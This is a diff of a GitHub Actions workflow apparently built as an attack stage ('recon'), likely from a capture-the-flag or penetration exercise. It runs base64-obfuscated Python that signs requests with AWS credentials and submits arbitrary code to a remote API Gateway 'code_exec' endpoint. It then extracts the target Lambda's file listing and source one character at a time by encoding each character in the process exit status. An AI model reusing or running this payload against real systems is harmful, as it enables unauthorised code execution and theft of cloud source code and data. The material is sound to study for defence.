@@ -1,33 +1,28 @@
 name: Stage2
-
 on:
   push:
     branches:
       - corgi
-
 permissions:
   contents: read
-  id-token: write
 
 jobs:
   recon:
     runs-on: ubuntu-latest
-
+    env:
+      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
+      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+      AWS_SESSION_TOKEN: ${{ secrets.AWS_SESSION_TOKEN }}
+      AWS_DEFAULT_REGION: us-east-1
     steps:
-      - name: Assume CICD role through GitHub OIDC
-        uses: aws-actions/configure-aws-credentials@v4
-        with:
-          role-to-assume: arn:aws:iam::121774052880:role/cicdRole
-          aws-region: us-east-1
-
+      - name: Who am I
+        run: aws sts get-caller-identity
 
       - name: Fetch docs.html
-        run: |
-          curl -s https://d4ysu55xg7wfi.cloudfront.net/docs.html
+        run: curl -s https://d4ysu55xg7wfi.cloudfront.net/docs.html
 
-
-      - name: Read Lambda source + list task files
+      - name: Read Lambda source via inspect
         run: |
           pip install requests requests-aws4auth --quiet
-          B64='aW1wb3J0IGJvdG8zLCBiYXNlNjQsIHJlcXVlc3RzLCByZSwgdGltZQpmcm9tIHJlcXVlc3RzX2F3czRhdXRoIGltcG9ydCBBV1M0QXV0aAoKQVBJID0gJ2h0dHBzOi8vbDhzc3lhejY5Zi5leGVjdXRlLWFwaS51cy1lYXN0LTEuYW1hem9uYXdzLmNvbS9kZXYvY29kZV9leGVjJwpjcmVkcyA9IGJvdG8zLlNlc3Npb24oKS5nZXRfY3JlZGVudGlhbHMoKS5nZXRfZnJvemVuX2NyZWRlbnRpYWxzKCkKYXV0aCA9IEFXUzRBdXRoKGNyZWRzLmFjY2Vzc19rZXksIGNyZWRzLnNlY3JldF9rZXksICd1cy1lYXN0LTEnLCAnZXhlY3V0ZS1hcGknLCBzZXNzaW9uX3Rva2VuPWNyZWRzLnRva2VuKQoKZGVmIHJ1bihjb2RlKToKICAgIHIgPSByZXF1ZXN0cy5wb3N0KEFQSSwganNvbj17J2NvZGUnOiBiYXNlNjQuYjY0ZW5jb2RlKGNvZGUuZW5jb2RlKCkpLmRlY29kZSgpfSwgYXV0aD1hdXRoKQogICAgcmV0dXJuIHIuanNvbigpCgpkZWYgZWMocmVzcCk6CiAgICBtc2cgPSByZXNwLmdldCgnZXJyb3JNZXNzYWdlJywgJycpCiAgICBpbXBvcnQgcmUgYXMgcmUyCiAgICBtID0gcmUyLnNlYXJjaChyJ2V4aXQgc3RhdHVzIChcZCspJywgbXNnKQogICAgcmV0dXJuIGludChtLmdyb3VwKDEpKSBpZiBtIGVsc2UgTm9uZQoKIyBMaXN0IGZpbGVzIGluIC92YXIvdGFzawpyMSA9IHJ1biJpbXBvcnQgb3MsIGpzb247IGZpbGVzPVtdO1tvcy5wYXRoLmpvaW4ocixmKSBmb3IgcixkcyxmcyBpbiBvcy53YWxrKCcvdmFyL3Rhc2snKSBmb3IgZiBpbiBmc107IHJhaXNlIFN5c3RlbUV4aXQobGVuKHN0cihmaWxlcykpKSIpCnIxID0gcnVuKCJpbXBvcnQgb3M7IGZpbGVzPVtvcy5wYXRoLmpvaW4ocixmKSBmb3IgcixkcyxmcyBpbiBvcy53YWxrKCcvdmFyL3Rhc2snKSBmb3IgZiBpbiBmc107IHJhaXNlIFN5c3RlbUV4aXQobGVuKHN0cihmaWxlcykpKSIpCnByaW50KCdmaWxlcyBsaXN0IGxlbmd0aDonLCBlYyhyMSksICdyYXc6JywgcjEpCgpmaWxlc19sZW4gPSBlYyhyMSkgb3IgMAoKIyBSZWFkIHRoZSBmaWxlcyBsaXN0CnJlc3VsdCA9IFtdCmZvciBpIGluIHJhbmdlKG1pbihmaWxlc19sZW4sIDIwMCkpOgogICAgY29kZSA9IGYiaW1wb3J0IG9zOyBmaWxlcz1bb3MucGF0aC5qb2luKHIsZikgZm9yIHIsZHMsZnMgaW4gb3Mud2FsaygneC92YXIvdGFzaycpIGZvciBmIGluIGZzXTsgcmFpc2UgU3lzdGVtRXhpdChvcmQoc3RyKGZpbGVzKVt7aX1dKSkiLnJlcGxhY2UoJ3guJywgJycpCiAgICByID0gcnVuKGNvZGUpCiAgICBjID0gZWMocikKICAgIHJlc3VsdC5hcHBlbmQoY2hyKGMpIGlmIGMgZWxzZSAnPycpCiAgICB0aW1lLnNsZWVwKDAuMTUpCnByaW50KCcnLmpvaW4ocmVzdWx0KSkKCiMgUmVhZCBsYW1iZGFfZnVuY3Rpb24ucHkgZmlyc3QgMzAwIGNoYXJzCnNyYyA9IFtdCmZvciBpIGluIHJhbmdlKDMwMCk6CiAgICBjb2RlID0gZiJmPW9wZW4oJy92YXIvdGFzay9sYW1iZGFfZnVuY3Rpb24ucHknKTsgYz1mLnJlYWQoKTsgZi5jbG9zZSgpOyByYWlzZSBTeXN0ZW1FeGl0KG9yZChjW3tpfV0pKSIKICAgIHIgPSBydW4oY29kZSkKICAgIGMgPSBlYyhyKQogICAgc3JjLmFwcGVuZChjaHIoYykgaWYgYyBlbHNlICc/JykKICAgIHRpbWUuc2xlZXAoMC4xNSkKcHJpbnQoJz09PSBMQU1CREEgU09VUkNFID09PScpCnByaW50KCcnLmpvaW4oc3JjKSkK'
-          printf '%s' "$B64" | base64 -d > /tmp/src2.py && python3 /tmp/src2.py
+          B64='aW1wb3J0IGJvdG8zLCBiYXNlNjQsIHJlcXVlc3RzLCByZSwgdGltZQpmcm9tIHJlcXVlc3RzX2F3czRhdXRoIGltcG9ydCBBV1M0QXV0aAoKQVBJID0gJ2h0dHBzOi8vbDhzc3lhejY5Zi5leGVjdXRlLWFwaS51cy1lYXN0LTEuYW1hem9uYXdzLmNvbS9kZXYvY29kZV9leGVjJwpjcmVkcyA9IGJvdG8zLlNlc3Npb24oKS5nZXRfY3JlZGVudGlhbHMoKS5nZXRfZnJvemVuX2NyZWRlbnRpYWxzKCkKYXV0aCA9IEFXUzRBdXRoKGNyZWRzLmFjY2Vzc19rZXksIGNyZWRzLnNlY3JldF9rZXksICd1cy1lYXN0LTEnLCAnZXhlY3V0ZS1hcGknLCBzZXNzaW9uX3Rva2VuPWNyZWRzLnRva2VuKQoKZGVmIHJ1bihjb2RlKToKICAgIHIgPSByZXF1ZXN0cy5wb3N0KEFQSSwganNvbj17J2NvZGUnOiBiYXNlNjQuYjY0ZW5jb2RlKGNvZGUuZW5jb2RlKCkpLmRlY29kZSgpfSwgYXV0aD1hdXRoKQogICAgcmV0dXJuIHIuanNvbigpCgpkZWYgZWMocmVzcCk6CiAgICBtc2cgPSByZXNwLmdldCgnZXJyb3JNZXNzYWdlJywgJycpCiAgICBpbXBvcnQgcmUgYXMgcmUyCiAgICBtID0gcmUyLnNlYXJjaChyJ2V4aXQgc3RhdHVzIChcZCspJywgbXNnKQogICAgcmV0dXJuIGludChtLmdyb3VwKDEpKSBpZiBtIGVsc2UgTm9uZQoKciA9IHJ1bigiaW1wb3J0IGxhbWJkYV9mdW5jdGlvbiwgaW5zcGVjdDsgc3JjPWluc3BlY3QuZ2V0c291cmNlKGxhbWJkYV9mdW5jdGlvbik7IHJhaXNlIFN5c3RlbUV4aXQobGVuKHNyYykpIikKc3JjX2xlbiA9IGVjKHIpCnByaW50KGYic291cmNlIGxlbmd0aDoge3NyY19sZW59IHJhdzoge3J9IikKcjIgPSBydW4oImltcG9ydCBsYW1iZGFfZnVuY3Rpb24sIGluc3BlY3Q7IHNyYz1pbnNwZWN0LmdldHNvdXJjZShsYW1iZGFfZnVuY3Rpb24pOyByYWlzZSBTeXN0ZW1FeGl0KGxlbihzcmMpLy8yNTYpIikKaGlnaCA9IGVjKHIyKQpyZWFsX3NyY19sZW4gPSAoaGlnaCBvciAwKSoyNTYgKyAoc3JjX2xlbiBvciAwKQpwcmludChmInJlYWwgc291cmNlIGxlbmd0aDoge3JlYWxfc3JjX2xlbn0iKQpzcmMgPSBbXQpmb3IgaSBpbiByYW5nZShtaW4ocmVhbF9zcmNfbGVuIG9yIDAsIDUwMCkpOgogICAgY29kZSA9IGYiaW1wb3J0IGxhbWJkYV9mdW5jdGlvbiwgaW5zcGVjdDsgc3JjPWluc3BlY3QuZ2V0c291cmNlKGxhbWJkYV9mdW5jdGlvbik7IHJhaXNlIFN5c3RlbUV4aXQob3JkKHNyY1t7aX1dKSkiCiAgICByID0gcnVuKGNvZGUpCiAgICBjID0gZWMocikKICAgIHNyYy5hcHBlbmQoY2hyKGMpIGlmIGMgZWxzZSAnPycpCiAgICB0aW1lLnNsZWVwKDAuMTIpCnByaW50KCk7IHByaW50KCI9PT0gTEFNQkRBIFNPVVJDRSA9PT0iKTsgcHJpbnQoIiIuam9pbihzcmMpKQo='
+          printf '%s' "$B64" | base64 -d > /tmp/src3.py && python3 /tmp/src3.py
